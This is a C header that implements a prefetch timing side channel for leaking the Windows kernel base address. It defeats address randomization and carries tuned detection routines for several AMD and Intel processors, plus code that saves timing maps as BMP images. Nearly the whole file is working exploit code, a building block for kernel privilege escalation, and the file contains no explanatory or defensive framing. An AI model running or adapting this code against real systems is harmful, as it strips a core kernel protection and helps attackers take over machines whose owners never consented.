#ifndef _PREFETCH_LEAK_H
#define _PREFETCH_LEAK_H
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <time.h>



#define KERNEL_LOWER_BOUND 0xfffff80000000000ull
#define KERNEL_UPPER_BOUND 0xfffff80800000000ull

#define SCAN_START KERNEL_LOWER_BOUND
#define SCAN_END KERNEL_UPPER_BOUND

//#define KERNEL_SECTIONS 10
#define KERNEL_SECTIONS 0xC
#define DIFF 3

#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

#define STEP 0x100000
#define ITERATIONS 0x100
#define DUMMY_ITERATIONS 5

ULONG verbose = 1;

void bad_syscall();
UINT64 sidechannel(PVOID ptr);

int average_sidechannel(PVOID addr)
{
    bad_syscall();
    UINT64 val = sidechannel(addr);
    for (int i = 0; i < ITERATIONS; i++) {
        val += sidechannel(addr);
    }

    return val / (ITERATIONS + 1);
}

UINT64 address_to_index(UINT64 addr)
{
    return (addr - KERNEL_LOWER_BOUND) / STEP;
}

UINT32 avg = 0;

BOOL is_below_average(UINT32 val)
{
    return (val <= avg - DIFF);
}

UINT64 leak_kernel_base_amd_mobile()
{
    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };

    // get the timings for the whole search space
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (data[i] > (avg * 4))
        {
            data[i] = avg;
        }
        if (verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (verbose)
    {
        printf("avg for all: %i\n", avg);
    }

    int avg_signed = avg;
    // search for the kernel mapping
    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            int cur_signed = data[i + x];
            int deviation = abs(cur_signed - avg);
            // if any of the values are below the average then bail
            if (deviation < avg / 8)
            {
                cur_avg = 0;
                break;
            }
            cur_avg = 1;
        }

        // if this region is above the average we have a hit
        if (cur_avg)
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }

    // failed to find anything
    return 0;
}


UINT64 leak_kernel_base_amd_mobile_reliable()
{
    UINT64 prev_leak = leak_kernel_base_amd_mobile();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_amd_mobile();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }

        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}



UINT64 leak_kernel_base_amd()
{
    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };

    // get the timings for the whole search space
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (data[i] > (avg * 4))
        {
            data[i] = avg;
        }
        if (verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (verbose)
    {
        printf("avg for all: %i\n", avg);
    }


    // search for the kernel mapping
    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            // if any of the values are below the average then bail
            if (data[i + x] <= avg)
            {
                cur_avg = 0;
                break;
            }
            printf("possible: %p %i\n", KERNEL_LOWER_BOUND + ((i + x) * STEP), data[i + x]);
            cur_avg += data[i + x];
        }

        // if this region is above the average we have a hit
        cur_avg /= KERNEL_SECTIONS;
        if (cur_avg > avg)
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }

    // failed to find anything
    return 0;
}

// repeatedly try to leak the kernel base on amd. once two in a row match it will return
UINT64 leak_kernel_base_amd_reliable()
{
    UINT64 prev_leak = leak_kernel_base_amd();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_amd();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }

        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}

UINT64 most_frequent(UINT64* arr, int n)
{
    UINT64 maxcount = 0;
    UINT64 element_having_max_freq = 0;
    for (int i = 0; i < n; i++) {
        UINT64 count = 0;
        for (int j = 0; j < n; j++) {
            if (arr[i] == arr[j])
                count++;
        }

        if (count > maxcount) {
            maxcount = count;
            element_having_max_freq = arr[i];
        }
    }

    return element_having_max_freq;
}

// single attempt of finding the kernel base on intel N200
UINT64 leak_kernel_base_intel_n200()
{
    avg = 0;

    ULONG x = 0;


    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;
    UINT64 max = 0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (i == 0)
        {
            continue;
        }

        // force down to avg
        if (data[i] > (avg))
        {
            data[i] = avg;
        }
        if (verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (verbose)
    {
        printf("avg for all: %i\n", avg);
    }

    UINT32 thresh_1 = avg / 3;

    UINT64 kernel_base = 0;

    for (UINT64 i = 0; i < ARR_SIZE - 2; i++)
    {
        UINT32 cur_avg = 0;
        if (data[i] < avg - (avg / thresh_1) &&
            data[i + 1] < avg - (avg / thresh_1))
        {
            return  (KERNEL_LOWER_BOUND + ((i - 9) * STEP));
        }
    }
    return kernel_base;
}

UINT64 leak_kernel_base_intel_n200_reliable()
{
    UINT64 prev_leak = leak_kernel_base_intel_n200();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_intel_n200();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }


        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}

// single attempt of finding the kernel base on intel
UINT64 leak_kernel_base_intel()
{
    avg = 0;

    ULONG x = 0;


    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;
    UINT64 max = 0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;

    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
    }


    // on intel we use the most frequently occcuring timing
    UINT32 arr_size = ARR_SIZE;
    avg = most_frequent(data, ARR_SIZE);


    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (i == 0)
        {
            continue;
        }

        // force down to avg
        if (data[i] > (avg))
        {
            data[i] = avg;
        }
        if (verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (verbose)
    {
        printf("avg for all: %i\n", avg);
    }

    UINT32 thresh_1 = avg / 10;
    UINT32 thresh_2 = avg / 30;

    UINT64 kernel_base = 0;

    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            // dont fluxuate wildly...
            if (data[i + x] >= avg - thresh_2)
            {
                cur_avg = 0xFFFFFFFF;
                break;
            }
            cur_avg += data[i + x];
        }
        if (cur_avg == 0xFFFFFFFF)
        {
            continue;
        }
        cur_avg /= KERNEL_SECTIONS;
        if (verbose) {
            printf("%p cur_avg: %i\n", (KERNEL_LOWER_BOUND + (i * STEP)), cur_avg);
        }
        if (cur_avg < (avg - thresh_1)) // we might need a threshold again for intel...
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }
    return kernel_base;
}


UINT64 leak_kernel_base_intel_old()
{
    ULONG x = 0;

    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;

    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + (i * STEP);
        }
        total_for_avg += data[i];
        //printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        if (verbose)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }
    UINT32 arr_size = ARR_SIZE;
    avg = total_for_avg / arr_size;
    //printf("total for avg: %i\n", total_for_avg);
    //printf("array size: %i\n", ARR_SIZE);
    //printf("avg for all: %i\n", avg);

    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        if (is_below_average(data[i]))
        {
            BOOL possible = TRUE;
            for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
            {
                if (!is_below_average(data[i + x])) {
                    possible = FALSE;
                }
            }
            if (possible)
            {
                return KERNEL_LOWER_BOUND + ((i + 4) * STEP);
                //printf("Possible kernel base: %p\n", KERNEL_LOWER_BOUND + ((i + 4) * STEP));
            }
        }
    }
    return 0;
}

UINT64 leak_kernel_base_intel_reliable()
{
    UINT64 prev_leak = leak_kernel_base_intel();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_intel();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }


        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}


DWORD write_bmp(HANDLE hFile, char* data, DWORD len) {
    DWORD dwBytesWritten = 0;
    WriteFile(
        hFile,           // open file handle
        data,      // start of data to write
        len,  // number of bytes to write
        &dwBytesWritten, // number of bytes that were written
        NULL);            // no overlapped structure
    return dwBytesWritten;
}

DWORD write_bmp_dword(HANDLE hFile, DWORD val) {
    return write_bmp(hFile, &val, 4);
}

void save_bmp(char* bmp_name, INT64* data, size_t len) {
    HANDLE hFile = CreateFileA(bmp_name,                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    write_bmp(hFile, "\x42\x4D", 2); // magic
    write_bmp_dword(hFile, 54 + len * 3); // full size
    write_bmp_dword(hFile, 0); // app specific
    write_bmp_dword(hFile, 54); // header size
    write_bmp_dword(hFile, 40); // DIB size
    write_bmp_dword(hFile, 256); // width
    write_bmp_dword(hFile, len / 256); // height
    write_bmp(hFile, "\x01\x00", 2); // color planes
    write_bmp(hFile, "\x18\x00", 2); // bits per pixel
    write_bmp_dword(hFile, 0); // compression
    write_bmp_dword(hFile, len * 3); // body size
    write_bmp_dword(hFile, 0); // misc
    write_bmp_dword(hFile, 0); // misc
    write_bmp_dword(hFile, 0); // misc
    write_bmp_dword(hFile, 0); // misc

    INT64 common = most_frequent(data, len);
    if (common == 0) { common = 1; }
    double min = common / 2;
    double max = common * 2;
    printf("Min: %f Max: %f  Common: %d \r\n", min, max, common);
    char color[3];

    for (UINT64 i = 0; i < len; i++)
    {
        memset(color, 0, 3);
        if (data[i] < (common - 1)) {

            double val;
            if (data[i] < min)
                val = 1.0;
            else
                val = (common * 1.0 - data[i]) / (common * 1.0 - min);
            unsigned char cval = val * 255;
            //printf("Negative anomaly: (%d) -%f %d\r\n", data[i], val, cval);
            color[0] = cval;
        }
        if (data[i] > (common + 1)) {
            double val;
            if (data[i] > max)
                val = 1.0;
            else
                val = (data[i] * 1.0 - common) / (max * 1.0 - common);

            unsigned char cval = val * 255;
            //printf("Positive anomaly: (%d) +%f %d\r\n", data[i], val, cval);
            color[2] = cval;
        }
        write_bmp(hFile, color, 3);

    }
    CloseHandle(hFile);
}

#define STRIP_ROUNDS 5

UINT64 leak_kernel_base_intel_strip()
{
    ULONG x = 0;

    UINT64 data[ARR_SIZE] = { 0 };
    INT64 ANOMALY_MAP[ARR_SIZE] = { 0 };
    printf("STRIP VERSION RUNNING\r\n");

    for (UINT64 round = 0; round < STRIP_ROUNDS; round++) {

        // Do the measurements
        for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
        {
            for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
            {
                UINT64 test = SCAN_START + idx * STEP;
                bad_syscall();
                UINT64 time = sidechannel((PVOID)test);
                if (i >= DUMMY_ITERATIONS)
                    data[idx] += time;
            }
        }


        // Normalize results
        for (UINT64 i = 0; i < ARR_SIZE; i++)
        {
            data[i] /= ITERATIONS;
        }

        UINT64 common = most_frequent(data, ARR_SIZE);
        UINT64 anomaly_size = 0;
        UINT64 anomaly = 0;
        for (UINT64 i = 0; i < ARR_SIZE; i++) {
            if (data[i] >= (common - 1) && data[i] <= (common + 1)) {
                if (anomaly_size > 8) {
                    //printf("Anomaly of length %d from %llx\r\n", anomaly_size, anomaly);
                    for (UINT64 j = i - anomaly_size; j < i; j++) {
                        ANOMALY_MAP[j] += data[j]-common;
                    }
                }

                anomaly = 0;
                anomaly_size = 0;
                continue;
            }
            if (anomaly_size == 0) {
                anomaly = (KERNEL_LOWER_BOUND + (i * STEP));
            }
            anomaly_size++;
        }
        
        memset(data, 0, ARR_SIZE*sizeof(UINT64));
    }
    // Evaluate anomalies
    /*UINT64 anomaly_size = 0;

    for (UINT64 j = 0; j < ARR_SIZE; j++) {
        if (ANOMALY_MAP[j] != STRIP_ROUNDS) {
            if (anomaly_size > 0) {
                printf("5 star anomaly strip from %llx, length %d\r\n", (KERNEL_LOWER_BOUND + ((j - anomaly_size) * STEP)), anomaly_size);
            }
            anomaly_size = 0;
            continue;
        }
        anomaly_size++;
    }*/

    save_bmp("intel_strip.bmp", ANOMALY_MAP,ARR_SIZE);
    UINT64 anomaly_size = 0;
    UINT64 fast_access = 0;
    for (UINT64 j = 0; j< ARR_SIZE; j++)
    {
        /*if (ANOMALY_MAP[j] != 0) {
            printf("ANOMALY_MAP %llx : %d\r\n", (KERNEL_LOWER_BOUND + (j * STEP)), ANOMALY_MAP[j]);
        }*/
        if (ANOMALY_MAP[j] == 0) {
            if (anomaly_size > 20 && fast_access > 3) {
                return  (KERNEL_LOWER_BOUND + ((j-anomaly_size) * STEP));
            }
            anomaly_size = 0;
            fast_access = 0;
            continue;
        }
        if (ANOMALY_MAP[j] < 0) {
            fast_access++;
        }
        anomaly_size++;
    }
    return 0;
}



VOID print_timings()
{
    ULONG x = 0;

    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 min = ~0, max = 0, addr = ~0;

    time_t t;
    char bmp_name[64];
    
    time(&t);
    snprintf(bmp_name, 64, "pt_%lld.bmp", (long long)t);
    printf("BMP name: %s\r\n", bmp_name);  

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;
    
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;

        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + (i * STEP);
        }

        total_for_avg += data[i];
        printf("%d) %llx %ld\n", i, (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
    }
    save_bmp(bmp_name, data, ARR_SIZE);
   
    avg = total_for_avg / ARR_SIZE;

    printf("avg: %i\n", avg);
    
    return 0;
}


typedef enum _CPU_VENDOR {
    CpuUnknown,
    CpuIntel,
    CpuIntelN200,
    CpuInteli7,
    CpuAmd,
    CpuAmdMobile
} CPU_VENDOR;

CPU_VENDOR determine_cpu_vendor()
{
    NTSTATUS status = 0;
    ULONG returned_len;
    CHAR brand_string[0x100] = { 0 };

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)105, brand_string, sizeof(brand_string), &returned_len);
    if (status != 0)
    {
        printf("Failed to get processor brand string!\n");
        return CpuUnknown;
    }
    printf("Processor: %s\n", brand_string);

    if (strstr(brand_string, "Intel"))
    {
        if (strstr(brand_string, "N200"))
        {
            return CpuIntelN200;
        }
        if (strstr(brand_string, "i7"))
        {
            return CpuInteli7;
        }
        return CpuIntel;
    }

    if (strstr(brand_string, "AMD"))
    {
        if (strstr(brand_string, "Mobile"))
        {
            return CpuAmdMobile;
        }
        return CpuAmd;
    }

    return CpuUnknown;
}

UINT64 leak_kernel_base_reliable()
{
    CPU_VENDOR vendor = determine_cpu_vendor();
    UINT64 kernel_base = 0;
    if (vendor == CpuAmd)
    {
        kernel_base = leak_kernel_base_amd_reliable();
    }
    else if (vendor == CpuAmdMobile)
    {
        kernel_base = leak_kernel_base_amd_mobile_reliable();
    }
    else if (vendor == CpuIntel)
    {
        kernel_base = leak_kernel_base_intel_reliable();
    }
    else if (vendor == CpuInteli7)
    {
        kernel_base = leak_kernel_base_intel_strip();
    }
    else if (vendor == CpuIntelN200)
    {
        kernel_base = leak_kernel_base_intel_n200_reliable();
    }
    else
    {
        printf("Unknown CPU vendor!\n");
        return 0;
    }

    return kernel_base;
}


#endif
